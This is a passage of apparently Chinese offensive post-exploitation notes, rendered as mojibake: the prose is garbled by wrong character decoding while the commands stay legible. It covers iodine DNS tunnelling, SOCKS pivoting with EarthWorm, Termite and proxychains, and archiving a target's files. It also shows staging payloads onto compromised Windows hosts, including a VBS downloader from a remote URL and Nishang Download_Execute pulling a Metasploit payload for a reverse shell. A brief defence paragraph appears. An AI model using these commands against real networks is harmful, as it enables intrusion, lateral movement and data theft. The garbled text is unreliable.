ä½¿ç”¨0.å…ˆå‡†å¤‡åŸŸå(å’Œä¸Šé¢ç±»ä¼¼)åŸŸåæœåŠ¡å•†ï¼šnamecheapå¢åŠ Aè®°å½•ï¼ŒNSè®°å½•æµ‹è¯•DNSæ˜¯å¦è§£ææˆåŠŸ 1.å®‰è£…æœåŠ¡ç«¯ apt-get install iodine # å¯åŠ¨ iodined -f -c -P pass123456 192.168.1.1 vpn.360bobao.xyz -DD # 192.168.0.1æ˜¯è™šæ‹Ÿçš„ip # å‚æ•°å«ä¹‰ï¼š -f # å‰å°è¿è¡Œ -c # ç¦æ­¢æ£€æŸ¥æ‰€æœ‰ä¼ å…¥è¯·æ±‚å®¢æˆ·ç«¯IPåœ°å€ -P # è®¾ç½®éªŒè¯å¯†ç  -D # æŒ‡å®šè°ƒè¯•ç­‰çº§ -DDæŒ‡ç¬¬äºŒçº§ï¼Œ Dçš„æ•°é‡éšç­‰çº§å¢åŠ  # æ£€æŸ¥é…ç½®æ˜¯å¦æ­£ç¡® https://code.kryo.se/iodine/check-it ç›´æ¥è¾“å…¥åŸŸåè¿›è¡Œæ£€æŸ¥ 2.å®‰è£…iodineå®¢æˆ·ç«¯ ## å®‰è£… # win ä¸‹è½½winç¼–è¯‘å¥½çš„ç‰ˆæœ¬ï¼ŒåŒæ—¶ä¸‹è½½openvpnæˆ–è€…TAPç½‘å¡é©±åŠ¨ç¨‹åº(å®‰è£…æ—¶ä»…é€‰æ‹©TAP-Win32é©±åŠ¨) # Linux apt-get install iodine ## å¯åŠ¨å®¢æˆ·ç«¯ â€‹```bash # win(æ‰“å¼€é‡Œé¢win32çš„bin,éœ€è¦ç®¡ç†å‘˜æƒé™) lodine.exe -f -P pass123456 vpn.360bobao.xyz #å¦‚æœå‡ºç°"COnnection setup complete,tranmitting data"å°±è¡¨ç¤ºæˆåŠŸ # Linux lodine -f -P pass123456 vpn.360bobao.xyz -M 200 # æµ‹è¯•èƒ½å¦ä½¿ç”¨(å®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯å·²ç»å±äºåŒä¸€å†…ç½‘äº†) ping 192.168.1.1 # è™šæ‹Ÿå‡ºæ¥çš„æœåŠ¡ç«¯çš„ç½‘å¡ip ## å‚æ•°ï¼š -r å¼ºåˆ¶åœ¨ä»»ä½•æƒ…å†µä¸‹ä½¿ç”¨DNSéš§é“(å› ä¸ºæœ‰æ—¶å€™ä¼šè‡ªåŠ¨åŠ¨åˆ‡æ¢ä¸ºUDPéš§é“) -M æŒ‡å®šä¸Šè¡Œä¸»æœºåçš„å¤§å° -m è°ƒèŠ‚æœ€å¤§ä¸‹è¡Œåˆ†ç‰‡çš„å¤§å° -T æŒ‡å®šæ‰€ä½¿ç”¨çš„DNSè¯·æ±‚çš„ç±»å‹ã€‚å¯é€‰ï¼šNULL,PRIVATE,TXT,SRV,CNAME.MX,A -O æŒ‡å®šæ•°æ®ç¼–ç è§„èŒƒ -L æŒ‡å®šæ˜¯å¦å¼€å¯æ‡’æƒ°æ¨¡å¼(é»˜è®¤å¼€å¯) -I æŒ‡å®šè¯·æ±‚ä¸è¯·æ±‚ä¹‹é—´æ—¶é—´é—´éš” 3.ä½¿ç”¨DNSéš§é“ # ç”±äºå®¢æˆ·ç«¯ä¸æœåŠ¡ç«¯å·²ç»å±äºåŒä¸€å†…ç½‘äº†ï¼Œæ‰€ä»¥ç›´æ¥è®¿é—®å³å¯ mstsc 192.168.128:3389 # ç­‰æ–¹æ³• # route å¯ä»¥æŸ¥çœ‹åˆ°è·¯ç”± é˜²å¾¡DNSéš§é“çš„æ–¹æ³• ç¦æ­¢ç½‘ç»œä¸­ä»»ä½•äººå‘å¤–éƒ¨æœåŠ¡å™¨å‘é€DNSè¯·æ±‚ï¼Œåªå…è®¸ä¸å—ä¿¡ä»»çš„DNSæœåŠ¡å™¨é€šä¿¡ è™½ç„¶æ²¡æœ‰äººä¼šå°†TXTè§£æè¯·æ±‚å‘é€ç»™DNSæœåŠ¡å™¨ï¼Œä½†æ˜¯dnscat2å’Œé‚®ä»¶æœåŠ¡å™¨/ç½‘å…³ä¼šè¿™æ ·åšã€‚å› æ­¤å¯ä»¥å°†é‚®ä»¶æœåŠ¡å™¨/ç½‘å…³åˆ—å‡ºç™½åå•å¹¶ç»„ç»‡ä¼ å…¥å’Œä¼ å‡ºæµé‡ä¸­TXTè¯·æ±‚ è·Ÿè¸ªç”¨æˆ·çš„DNSæŸ¥è¯¢æ¬¡æ•°ã€‚å¦‚æœè¾¾åˆ°é˜ˆå€¼ï¼Œå°±ç”Ÿæˆç›¸åº”çš„æŠ¥å‘Š é˜»æ­¢ICMP å„ç§éš§é“æŠ€æœ¯çš„ä¼˜åŠ£ æ ¹æ®å®é™…ç¯å¢ƒé€‰æ‹©æŠ€æœ¯DNS+SSHéš§é“ç»“åˆ SOCKSä»£ç† å¸¸è§çš„ç½‘ç»œåœºæ™¯ 1.æœåŠ¡å™¨åœ¨å†…ç½‘ï¼Œå¯ä»¥ä»»æ„è®¿é—®å¤–éƒ¨ç½‘ç»œ 2.æœåŠ¡å™¨åœ¨å†…ç½‘ï¼Œå¯ä»¥è®¿é—®å¤–éƒ¨ç½‘ç»œï¼Œä½†æœåŠ¡å™¨å®‰è£…äº†é˜²ç«å¢™æ¥æ‹’ç»æ•æ„Ÿç«¯å£çš„è¿æ¥ 3.æœåŠ¡å™¨åœ¨å†…ç½‘ï¼Œå¯¹å¤–åªå¼€æ”¾äº†éƒ¨åˆ†ç«¯å£(å¦‚80ç«¯å£)ï¼Œä¸”æœåŠ¡å™¨ä¸èƒ½è®¿é—®å¤–éƒ¨ç½‘ç»œ SOCKSæ˜¯ä¸€ç§ä»£ç†æœåŠ¡ï¼Œå¯ç®€å•çš„å°†ä¸€ç«¯çš„ç³»ç»Ÿè¿æ¥å¦ä¸€ç«¯ã€‚SOCKSæ”¯æŒå¤šç§åè®®ã€‚SOCKSåˆ†ä¸ºSOCKS4å’ŒSOCKS5ã€‚SOCKS4åªæ”¯æŒTCPåè®®ï¼ŒSOCKS5ä¸ä»…æ”¯æŒTCP/UDPï¼Œè¿˜æ”¯æŒå„ç§èº«ä»½éªŒè¯æœºåˆ¶ç­‰ï¼Œæ ‡å‡†ç«¯å£ä¸º1080ã€‚SOCKSèƒ½ä¸ç›®æ ‡å†…ç½‘è®¡ç®—æœºè¿›è¡Œé€šä¿¡ï¼Œé¿å…å¤šæ¬¡ä½¿ç”¨ç«¯å£è½¬å‘ã€‚ å¸¸è§SOCKSä»£ç†å·¥å…·å¯ç†è§£ä¸ºå¢å¼ºç‰ˆçš„lcxã€‚ä»–åœ¨æœåŠ¡ç«¯ç›‘å¬ä¸€ä¸ªç«¯å£ï¼Œå½“æœ‰æ–°è¿æ¥å‡ºç°æ—¶ï¼Œä¼šå…ˆä»SOCKSåè®®ä¸­è§£æå‡ºç›®æ ‡çš„URLçš„ç›®æ ‡ç«¯å£ï¼Œå†æ‰§è¡Œlcxçš„å…·ä½“åŠŸèƒ½socksä»£ç†å·¥å…·å°½é‡é€‰åˆ™å°ä¸”å‘½ä»¤è¡Œçš„ 1. EarthWorm(EW)è·¨å¹³å°ï¼ŒSOCKS5æ¶æ„ï¼Œèƒ½ä»¥æ­£å‘ã€åå‘ã€å¤šçº§çº§è”ç­‰æ–¹å¼å»ºç«‹ç½‘ç»œéš§é“ä¸‹è½½åœ°å€ï¼šhttps://github.com/rootkiter/EarthWormæ–°ç‰ˆæœ¬Termite: https://github.com/rootkiter/Termite 2. reGeorg(reDuhçš„å‡çº§ç‰ˆ)å¯ä»¥ä½¿ç›®æ ‡æœåŠ¡å™¨åœ¨å†…ç½‘ä¸­(æˆ–è€…åœ¨è®¾ç½®äº†ç«¯å£ç­–ç•¥çš„æƒ…å†µä¸‹)è¿æ¥å†…éƒ¨å¼€å‘ç«¯å£åˆ©ç”¨webshellå»ºç«‹ä¸€ä¸ªsocksä»£ç†è¿›è¡Œå†…ç½‘ç©¿é€ï¼ŒæœåŠ¡å™¨å¿…é¡»æ”¯æŒASPX, PHP, JSPä¸­çš„ä¸€ç§ã€‚ 3. sSocksæ”¯æŒSOCKS5éªŒè¯ï¼Œæ”¯æŒIPv6å’ŒUDPï¼Œå¹¶æä¾›åå‘SOCKSä»£ç†æœåŠ¡(å°†è¿œç¨‹è®¡ç®—æœºä½œä¸ºSOCKSä»£ç†æœåŠ¡ç«¯åå¼¹åˆ°æœ¬åœ°) 4. SocksCap64http://www.sockscap64.comwindowsä¸Šçš„å…¨å±€ä»£ç†è½¯ä»¶å³ä¾¿æ˜¯æœ¬èº«ä¸æ”¯æŒSOCKSä»£ç†çš„åº”ç”¨ç¨‹åºï¼Œä¹Ÿå¯ä»¥é€šè¿‡å…¶å®ç°ä»£ç†è®¿é—® 5. Proxifierhttps://www.proxifier.com/ 6. ProxyChainshttp://proxychains.sourceforge.net/https://github.com/haad/proxychainsLinuxä¸‹å®ç°å…¨å±€ä»£ç†çš„è½¯ä»¶ï¼Œå¯ä»¥ä½¿ä»»ä½•ç¨‹åºé€šè¿‡ä»£ç†ä¸Šç½‘ï¼Œå…è®¸TCPå’ŒDNSæµé‡é€šè¿‡ä»£ç†éš§é“ï¼Œæ”¯æŒHTTPã€SOCKS4ã€SOCKS5ç±»å‹çš„ä»£ç†æœåŠ¡å™¨ å·¥å…·ä½¿ç”¨1. EarthWorm(EW)å…­ç§å‘½ä»¤æ ¼å¼ï¼š ssocksd # ç”¨äºæ™®é€šç½‘ç»œç¯å¢ƒçš„æ­£å‘è¿æ¥å‘½ä»¤ rcsocks # ç”¨äºæ™®é€šç½‘ç»œç¯å¢ƒçš„åå‘è¿æ¥å‘½ä»¤ rssocks lcx_slave lcx_listen lcx_tran æ­£å‘SOCKS 5 æœåŠ¡å™¨ # é€‚ç”¨äºç›®æ ‡æœºå™¨æ‹¥æœ‰ä¸€ä¸ªå¤–ç½‘ipçš„æƒ…å†µ ew -s ssocksd -l 888 # å‡è®¾ä¸€ä¸ªç«¯å£ä¸º888çš„SOCKSä»£ç† # æ¥ä¸‹æ¥ï¼Œå¯ä»¥ä½¿ç”¨SocksCap64æ·»åŠ è¿™ä¸ªä»£ç†åœ°å€å³å¯ åå¼¹SOCKS 5 æœåŠ¡å™¨ # ç›®æ ‡æœºå™¨æ²¡æœ‰å…¬ç½‘IPåœ°å€çš„æƒ…å†µ / æˆ–è€…åœ¨å†…ç½‘å†…éƒ¨ç”¨ #1.å…ˆæŠŠewä¸Šä¼ åˆ°å…¬ç½‘vpsä¸­ï¼Œå¹¶æ‰§è¡Œ ew -s rcsocks -l 1008 -e 888 # å«ä¹‰ï¼šåœ¨å…¬ç½‘vpsä¸Šæ·»åŠ ä¸€ä¸ªè½¬æ¥éš§é“ï¼ŒæŠŠ1008æ”¶åˆ°çš„ä»£ç†è¯·æ±‚è½¬å‘ç»™888ç«¯ #2.ç„¶åæŠŠewä¸Šä¼ åˆ°webæœåŠ¡å™¨(å†…ç½‘)ï¼Œå¹¶æ‰§è¡Œ ew -s rssocks -d &lt;å…¬ç½‘vps_IP> -e 888 #3.ç„¶åç”¨SocksCap64ç­‰æ·»åŠ ä»£ç†åœ°å€ä¸ºvpsçš„ip:1008 #4.å›åˆ°vpså‘ç°åå¼¹æˆåŠŸï¼Œå°±å¯ä»¥é€šè¿‡vpsçš„1008ç«¯å£ä½¿ç”¨å‡è®¾åœ¨webæœåŠ¡å™¨ä¸Šçš„SOCKS5ä»£ç†æœåŠ¡äº† å¤šçº§çº§è”ï¼šCase1. lcx_tran # æƒ…æ™¯ï¼švpsèƒ½è¿æ¥webæœåŠ¡å™¨ï¼ŒwebæœåŠ¡å™¨èƒ½è¿æ¥æ•°æ®åº“æœåŠ¡å™¨ä½†æ˜¯ä¸èƒ½è¿æ¥DCï¼Œæ•°æ®åº“æœåŠ¡å™¨èƒ½è¿æ¥DCä½†æ˜¯ä¸èƒ½è®¿é—®å¤–ç½‘ # æ‰€ä»¥ï¼Œåœ¨æ•°æ®åº“æœåŠ¡å™¨å»ºç«‹SOCKSæœåŠ¡ï¼Œç«¯å£è½¬å‘ç»™webæœåŠ¡å™¨ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥é“¾æ¥webæœåŠ¡å™¨ # 1.åœ¨DBæœåŠ¡å™¨ ew -s ssocksd -l 9999 # 2.åœ¨vps ew -s lcx_tran -l 1008 -f 127.0.0.1 -g 9999 # 3.ä½¿ç”¨å·¥å…·è¿æ¥vps1008å³å¯ Case2. lcx_listen, lcx_slave #1. vps ew -s lcx_listen -l 1080 -e 8888 #2. DBå†…ç½‘ä¸»æœº ew -s ssocksd -l 9999 #3. å¦ä¸€å°å†…ç½‘ä¸»æœº ew -s lcx_slave -d 192.168.0.100 -e 8888 -f 1.1.1.10 -g 9999 #4. æœ€åè¿æ¥vpsçš„1080ç«¯å£ ä¸‰çº§çº§è” #1. vps(192.168.0.103) ew -s lcx_listen -l 1001 -e 113 #2.A ew -s lcx_slave -d 192.168.0.103 -e 113 -f 1.1.1.10 -g 123 #3. B(1.1.1.10) ew -s lcx_listen -l 123 -e 133 #4. Cä¸»æœºï¼Œå¯åŠ¨SOCKS 5æœåŠ¡ï¼Œå¹¶åå¼¹åˆ°Bä¸»æœºçš„123ç«¯å£ ew -s rssocks -d 1.1.1.10 -e 133 #5. ä½¿ç”¨ä»£ç†å·¥å…·è¿æ¥vpsçš„1001 2.Termite åˆ†ä¸ºä¸¤éƒ¨åˆ†ï¼šadmin_exeå’Œagent_exeè¢«æ§è€… # Usage 1. ä»¥æœåŠ¡æ¨¡å¼å¯åŠ¨ä¸€ä¸ªagentæœåŠ¡ã€‚ > $ ./agent -l 8888 2. ä»¤ç®¡ç†ç«¯è¿æ¥åˆ°agentå¹¶å¯¹agentè¿›è¡Œç®¡ç†ã€‚ > $ ./admin -c 127.0.0.1 -p 8888 3. æ­¤æ—¶ï¼Œadminç«¯ä¼šå¾—åˆ°ä¸€ä¸ªå†…ç½®çš„shell, è¾“å…¥helpæŒ‡ä»¤å¯ä»¥å¾—åˆ°å¸®åŠ©ä¿¡æ¯ã€‚ >> help 4. é€šè¿‡showæŒ‡ä»¤å¯ä»¥å¾—åˆ°å½“å‰agentçš„æ‹“æ‰‘æƒ…å†µã€‚ >> show 0M +-- 1M ç”±äºå½“å‰æ‹“æ‰‘ä¸­åªæœ‰ä¸€ä¸ªagentï¼Œæ‰€ä»¥å±•ç¤ºç»“æœåªæœ‰ 1M , å…¶ä¸­1 ä¸ºèŠ‚ç‚¹çš„IDå·ï¼Œ Mä¸ºMacOSç³»ç»Ÿçš„ç®€å†™ï¼ŒLinuxä¸ºLï¼ŒWindowsç®€å†™ä¸ºWã€‚ 5. å°†æ–°agentåŠ å…¥å½“å‰æ‹“æ‰‘ > ./agent -c 127.0.0.1 -p 8888 6. æ­¤æ—¶showæŒ‡ä»¤å°†å¾—åˆ°å¦‚ä¸‹æ•ˆæœ 0M +-- 1M | +-- 2M è¿™è¡¨æ˜ï¼Œå½“å‰æ‹“æ‰‘ä¸­æœ‰ä¸¤ä¸ªèŠ‚ç‚¹ï¼Œå…¶ä¸­ç”±äº2èŠ‚ç‚¹éœ€è¦é€šè¿‡1èŠ‚ç‚¹æ‰èƒ½è®¿é—®ï¼Œæ‰€ä»¥ä¸‹æŒ‚åœ¨1èŠ‚ç‚¹ä¸‹æ–¹ã€‚ 7. åœ¨2èŠ‚ç‚¹å¼€å¯socksä»£ç†ï¼Œå¹¶ç»‘å®šåœ¨æœ¬åœ°ç«¯å£ >> goto 2 å°†å½“å‰è¢«ç®¡ç†èŠ‚ç‚¹åˆ‡æ¢ä¸º 2 å·èŠ‚ç‚¹ã€‚ >> socks 1080 æ­¤æ—¶ï¼Œæœ¬åœ°1080 ç«¯å£ä¼šå¯åŠ¨ä¸ªç›‘å¬æœåŠ¡ï¼Œè€ŒæœåŠ¡æä¾›è€…ä¸º2å·èŠ‚ç‚¹ã€‚ 8. åœ¨1å·èŠ‚ç‚¹å¼€å¯ä¸€ä¸ªshellå¹¶ç»‘å®šåˆ°æœ¬åœ°ç«¯å£ >> goto 1 >> shell 7777 æ­¤æ—¶ï¼Œé€šè¿‡ncæœ¬åœ°çš„ 7777 ç«¯å£ï¼Œå°±å¯ä»¥å¾—åˆ°ä¸€ä¸ª 1 èŠ‚ç‚¹æä¾›çš„ shell. 9. å°†è¿œç¨‹çš„æ–‡ä»¶ä¸‹è½½è‡³æœ¬åœ° >> goto 1 >> downfile 1.txt 2.txt å°†1 èŠ‚ç‚¹ï¼Œç›®å½•ä¸‹çš„ 1.txt ä¸‹è½½è‡³æœ¬åœ°ï¼Œå¹¶å‘½åä¸º2.txt 10. ä¸Šä¼ æ–‡ä»¶è‡³è¿œç¨‹èŠ‚ç‚¹ >> goto 2 >> upfile 2.txt 3.txt å°†æœ¬åœ°çš„ 2.txt ä¸Šä¼ è‡³ 2å·èŠ‚ç‚¹çš„ç›®å½•ï¼Œå¹¶å‘½åä¸º3.txt 11. ç«¯å£è½¬æ¥ >> goto 2 >> lcxtran 3388 10.0.0.1 3389 ä»¥2å·èŠ‚ç‚¹ä¸ºè·³æ¿ï¼Œå°† 10.0.0.1 çš„ 3389 ç«¯å£æ˜ å°„è‡³æœ¬åœ°çš„ 3388 ç«¯å£ # æ›´å¤šæ”¯æŒ http://rootkiter.com/toolvideo/toolmp4/1maintalk.mp4 http://rootkiter.com/toolvideo/toolmp4/2socks.mp4 http://rootkiter.com/toolvideo/toolmp4/3lcxtran.mp4 http://rootkiter.com/toolvideo/toolmp4/4shell.mp4 http://rootkiter.com/toolvideo/toolmp4/5file.mp4 # è”ç³»ä½œè€… rootkiter@rootkiter.com 3. åœ¨Windowsä¸‹ä½¿ç”¨SocksCap64å®ç°å†…ç½‘æ¼«æ¸¸ä»£ç†æœåŠ¡å™¨å…ˆè®¾ç½®ï¼šew -s lcx_listen -l 10800 -e 888 ä»¥ç®¡ç†å‘˜æƒé™æ‰“å¼€1.ç‚¹å‡»ä»£ç†ï¼Œæ·»åŠ ä¸€ä¸ªä»£ç†(ä»£ç†æœåŠ¡å™¨çš„ipå’Œç«¯å£)2.ç‚¹å‡»é—ªç”µå›¾æ ‡ï¼Œæµ‹è¯•ä»£ç†æœåŠ¡å™¨æ˜¯å¦æ­£å¸¸3.é€‰æ‹©æµè§ˆå™¨ï¼Œå³é”®ï¼Œé€‰æ‹©åœ¨ä»£ç†éš§é“ä¸­è¿è¡Œé€‰æ‹©ç¨‹åºï¼Œç„¶åå°±å¯ä»¥è‡ªç”±è®¿é—®å†…ç½‘äº† 4. åœ¨Linuxä¸‹ä½¿ç”¨ProxyChainså®ç°å†…ç½‘æ¼«æ¸¸ # kaliä¸­å®‰è£…äº†ProxyChainsï¼Œåªéœ€é…ç½®å³å¯ # vim /etc/proxychains.conf å–æ¶ˆ dynamic_chain çš„æ³¨é‡Š ä¿®æ”¹ socks 127.0.0.1 1080 ä¸ºè‡ªå·±çš„ç«¯å£ # æµ‹è¯•æ˜¯å¦æ­£å¸¸ proxyresolv www.baidu.com # å¦‚æç¤ºæ²¡æ‰¾åˆ°å‘½ä»¤ cp /usr/lib/proxychains3/proxyresolv /use/bin/ # å¯åŠ¨ç«ç‹æµè§ˆå™¨(ä½¿ç”¨socksä»£ç†) proxychains firefox # å¯ä»¥è®¿é—®åˆ°å†…ç½‘çš„ç«™ç‚¹ # åŒæ ·nmapï¼Œsqlmapï¼Œmsféƒ½å¯ä»¥ä»¥ä»£ç†æ–¹å¼è¿è¡Œ proxychains nmap 192.168.0.1/24 proxychains sqlmap -u 192.168.0.12 proxychains msfconsole å‹ç¼©æ•°æ® 1. RARå¦‚æœç›®æ ‡å®‰è£…äº†win.rarï¼Œåˆ™ä¸å¿…å†å®‰è£…ï¼›å¦‚æœæ²¡æœ‰å®‰è£…ï¼Œåˆ™æ‰‹åŠ¨å®‰è£…ä¸ç³»ç»Ÿç‰ˆæœ¬å¯¹åº”çš„ï¼Œç„¶åæŠŠwin.exeæ‹¿å‡ºæ¥ å‚æ•°: a æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶ -k é”å®šå‹ç¼©æ–‡ä»¶ -s ç”Ÿæˆå­˜æ¡£æ–‡ä»¶(æé«˜å‹ç¼©æ¯”) -p æŒ‡å®šå‹ç¼©å¯†ç  -r é€’å½’å‹ç¼© -x æŒ‡å®šè¦æ’é™¤çš„æ–‡ä»¶ -v åˆ†å·æ‰“åŒ…(å¤§æ–‡ä»¶æ—¶å€™ç”¨å¤„å¾ˆå¤§) -ep ä»åç§°ä¸­æ’é™¤è·¯å¾„ -ep1 ä»åç§°ä¸­æ’é™¤åŸºæœ¬ç›®å½• -m0 å­˜å‚¨ï¼Œæ·»åŠ åˆ°å‹ç¼©æ–‡ä»¶æ—¶ä¸å‹ç¼© -m1 æœ€å¿«ï¼Œä½¿ç”¨æœ€å¿«å‹ç¼©æ–¹å¼(ä½å‹ç¼©æ¯”) -m2 è¾ƒå¿«ï¼Œä½¿ç”¨å¿«é€Ÿå‹ç¼©æ–¹å¼ -m3 æ ‡å‡†ï¼Œä½¿ç”¨æ ‡å‡†å‹ç¼©æ–¹å¼(é»˜è®¤) -m4 è¾ƒå¥½ï¼Œä½¿ç”¨è¾ƒå¼ºå‹ç¼©æ–¹å¼(é€Ÿåº¦è¾ƒæ…¢) -m5 æœ€å¥½ï¼Œä½¿ç”¨æœ€å¼ºå‹ç¼©æ–¹å¼(æœ€å¥½çš„å‹ç¼©æ–¹å¼ï¼Œä½†é€Ÿåº¦æœ€æ…¢) ä»¥RARæ ¼å¼å‹ç¼©/è§£å‹ # å‹ç¼© rar.exe a -k -r -s -m3 C:\\1.rar C:\\apps # è§£å‹ rar.exe e C:\\1.rar # -e # è§£å‹åˆ°å½“å‰æ ¹ç›®å½•ä¸‹ -x # ä»¥ç»å¯¹è·¯å¾„è§£å‹ # zipå’Œrarä¸€æ ·ï¼Œä¿®æ”¹åç¼€å³å¯ åˆ†å·å‹ç¼©/è§£å‹ # å‹ç¼©(æ¯ä¸ªå·çš„å¤§å°ä¸º20MB) rar.exe a -m0 -r -v20m C:\\1.rar C:\\apps # è§£å‹ rar.exe x C:\\1.part01.rar C:\\apps 2. 7-Zipä¸‹è½½åœ°å€ï¼šhttps://www.7-zip.org/å‚æ•°ï¼š -r é€’å½’å‹ç¼© -o æŒ‡å®šè¾“å‡ºç›®å½• -p æŒ‡å®šå¯†ç  -v åˆ†å·å‹ç¼© a æ·»åŠ å‹ç¼©æ–‡ä»¶ x è§£å‹ æ™®é€šå‹ç¼©/è§£å‹æ–¹å¼ # å‹ç¼© 7z.exe a -r -p123456 C:\apps\1.7z C:\apps # è§£å‹ 7z.exe x -p123456 C:\apps\1.7z -o C:\apps2 åˆ†å·å‹ç¼©/è§£å‹æ–¹å¼ # å‹ç¼©ï¼ˆæ¯ä¸ªåˆ†å·20MBï¼‰ 7z.exe a -r -vlm -p123456 C:\apps\1.7z C:\apps # è§£å‹ 7z.exe x -p123456 C:\apps\1.7z.001 -o C:\apps2 ä¸Šä¼ å’Œä¸‹è½½ å¯¹äºä¸èƒ½ä¸Šä¼ Shellï¼Œä½†æ˜¯å¯ä»¥æ‰§è¡Œå‘½ä»¤çš„WindowsæœåŠ¡å™¨ï¼Œå¯åœ¨shellç¯å¢ƒä¸­è¿›è¡Œä¸Šä¼ ä¸‹è½½æ“ä½œ 1.åˆ©ç”¨FTPä¸Šä¼ æ–‡ä»¶åœ¨æœ¬åœ°æˆ–vpsæ­å»ºFTPæœåŠ¡å™¨ å¸¸ç”¨FTPå‘½ä»¤ open 192.168.0.10 # è¿æ¥æœåŠ¡å™¨ cd &lt;ç›®å½•> lcd &lt;æ–‡ä»¶å¤¹è·¯å¾„> # å®šä½æœ¬åœ°æ–‡ä»¶å¤¹(ä¸Šä¼ æ–‡ä»¶çš„ä½ç½®æˆ–è€…ä¸‹è½½æ–‡ä»¶çš„ä¿å­˜ä½ç½®) type # æŸ¥çœ‹çš„å½“å‰çš„ä¼ è¾“æ–¹å¼(é»˜è®¤æ˜¯ASCIIç ä¼ è¾“) ascii # è®¾ç½®ä¼ è¾“æ–¹å¼ä¸ºasciiï¼ˆä¼ è¾“txtç­‰ï¼‰ binary # è®¾ç½®ä¼ è¾“æ–¹å¼ä¸ºäºŒè¿›åˆ¶ä¼ è¾“ï¼ˆä¼ è¾“exeå›¾ç‰‡è§†é¢‘å£°éŸ³ç­‰ï¼‰ close # ç»“æŸä¸æœåŠ¡å™¨çš„FTPå¯¹è¯ quit # ç»“æŸä¸æœåŠ¡å™¨çš„FTPå¯¹è¯å¹¶æ¨å‡ºFTPç¯å¢ƒ put &lt;æ–‡ä»¶å> [newname] # ä¸Šä¼ ï¼Œå¦‚æœä¸æŒ‡å®šnewnameï¼Œå°±ä¸ºåŸåå­— send &lt;æ–‡ä»¶å> [newname] # ä¸Šä¼ ï¼Œå¦‚æœä¸æŒ‡å®šnewnameï¼Œå°±ä¸ºåŸåå­— get &lt;æ–‡ä»¶å> [newname] # ä¸‹è½½ï¼Œå¦‚æœä¸æŒ‡å®šnewnameï¼Œå°±ä¸ºåŸåå­— mget filename [filename] # ä¸‹è½½å¤šä¸ªæ–‡ä»¶ã€‚æ”¯æŒç©ºæ ¼å’Œ"?"ä¸¤ä¸ªé€šé…ç¬¦ï¼ˆæ¯”å¦‚: mget .mp3 è¡¨ç¤ºä¸‹è½½FTPæœåŠ¡å™¨å½“å‰ç›®å½•ä¸‹æ‹“å±•åä¸ºmp3çš„æ–‡ä»¶ï¼‰ 2. åˆ©ç”¨VBSä¸Šä¼ æ–‡ä»¶ä¸»è¦æ˜¯æ˜¯ä½¿ç”¨msxm12.xmlhttpå’Œadoab.stream ä¸Šä¼  ä¸‹è½½ //æŠŠä¸‹é¢çš„å‘½ä»¤ä»¥æ­¤ä¿å­˜åˆ°æ–‡ä»¶ï¼ˆæ¯”å¦‚ echo "xxxxxxx" >> download.vbsï¼‰ Set Post = CreateObject("Msxm12.XMLHTTP"); Set Shell = CreateObject("Wscript.Shell"); Post.Open "GET","http://xxxx/target.exe" Post.Send(); Set aGet = CreateObject("ADODB.Stream"); aGet.Mode = 3 aGet.Type = 1 aGet.Open() aGet.Write(Post.responseBody); aGet.SaveToFile "C:\\test\target.exe",2 //ä¿å­˜ä¸ºdownload.vbsåï¼Œç„¶åæ‰§è¡Œä¸‹é¢çš„å‘½ä»¤ cscript download.vbs 3. åˆ©ç”¨Debugä¸Šä¼ åŸç†ï¼šå°†éœ€è¦ä¸Šä¼ çš„exeæ–‡ä»¶è½¬æ¢ä¸º16è¿›åˆ¶hexå½¢å¼ï¼Œå†é€šè¿‡echoå‘½ä»¤å°†hexä»£ç å†™å…¥æ–‡ä»¶ï¼Œæœ€ååˆ©ç”¨DebugåŠŸèƒ½å°†hexä»£ç ç¼–è¯‘å¹¶è¿˜åŸä¸ºexeæ–‡ä»¶ # exe2bat.exe åªæ”¯æŒ&lt;64KBçš„æ–‡ä»¶ï¼Œæ–¹æ³•ä¹Ÿè¾ƒå¤è€ # kaliä¸­ï¼Œexe2bat.exeä½äº/usr/share/windows-binariesç›®å½•ä¸‹ã€‚ # 1.åœ¨è¯¥ç›®å½•ä¸‹æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼ŒæŠŠéœ€è¦ä¸Šä¼ çš„ew.exeæ–‡ä»¶è½¬æ¢æˆhexå½¢å¼ wine exe2bat.exe ew.exe ew.txt # è¿™é‡Œï¼Œæµ‹è¯•ew.exeä»£ç†å·¥å…· # 2.ç„¶åæŠŠä¸Šé¢ç”Ÿæˆçš„æ–‡æœ¬å†…å®¹å¤åˆ¶ï¼Œechoåˆ°ç›®æ ‡ç³»ç»Ÿçš„æŸä¸ªç©ºæ–‡ä»¶ã€‚ä¾æ¬¡æ‰§è¡Œå‘½ä»¤ï¼Œç”Ÿæˆ1.dll, 123.hex, ew.exe copy 1.dll ew.exe 4. åˆ©ç”¨Nishangä¸Šä¼ # nishangä¸­çš„è„šæœ¬ï¼šDownload_Execute --> å¸¸ç”¨æ¥ä¸‹è½½æ–‡æœ¬æ–‡ä»¶å¹¶å°†å…¶è½¬ä¸ºexeæ–‡ä»¶ #1. å…ˆecho æ–¹æ³•æŠŠè„šæœ¬å†…å®¹ä¼ åˆ°ç›®æ ‡æœºå™¨ï¼Œå¹¶å°†æ‰©å±•åæ”¹ä¸ºps1 #2. åˆ©ç”¨nishangä¸­çš„exetotext.ps1è„šæœ¬å°†msfç”Ÿæˆçš„msf.exeä¿®æ”¹ä¸ºæ–‡æœ¬æ–‡ä»¶msf.txt .\ExetoText c:\msf.exe c:\msf.txt #3. è°ƒç”¨Download_Executeæ¥ä¸‹è½½å¹¶æ‰§è¡Œè¯¥æ–‡ä»¶ Download_Execute http://xxxxxx/msf.txt #4. å›åˆ°msfçš„ç›‘å¬çª—å£ï¼Œå¯ä»¥çœ‹åˆ°åå¼¹çš„shell 5. åˆ©ç”¨bitsadminä¸‹è½½å‘½ä»¤è¡Œå·¥å…·(win xpä¹‹åè‡ªå¸¦çš„å·¥å…·)ï¼Œ é€šå¸¸åŒäºåˆ›å»ºä¸‹è½½å’Œä¸Šä¼ è¿›ç¨‹å¹¶æ£€æµ‹å…¶è¿›å±• å¦‚æœæ¸—é€çš„ç›®æ 